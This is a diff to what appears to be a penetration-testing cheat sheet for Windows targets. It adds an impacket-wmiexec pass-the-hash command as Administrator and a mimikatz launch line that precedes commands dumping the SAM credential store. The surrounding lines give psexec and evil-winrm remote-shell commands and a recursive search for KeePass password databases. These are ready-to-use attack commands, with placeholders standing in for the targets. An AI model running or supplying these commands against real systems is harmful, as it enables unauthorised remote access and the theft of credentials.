@@ -110,6 +110,10 @@ Try to connect to console:
 impacket-psexec $USER:$PASSWORD@$TARGET_IP
 ```
 
+```bash
+impacket-wmiexec -hashes :$NTLM$ Administrator@$TARGET_IP
+```
+
 ```shell
 evil-winrm -i $TARGET_IP -u administrator -p $PASSWORD
 ```
@@ -150,6 +154,7 @@ Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyCont
 mimikatz dump as local admin:
 #dump #mimikatz
 ```powershell
+.\mimikatz
 privilege::debug
 token::elevate
 lsadump::sam
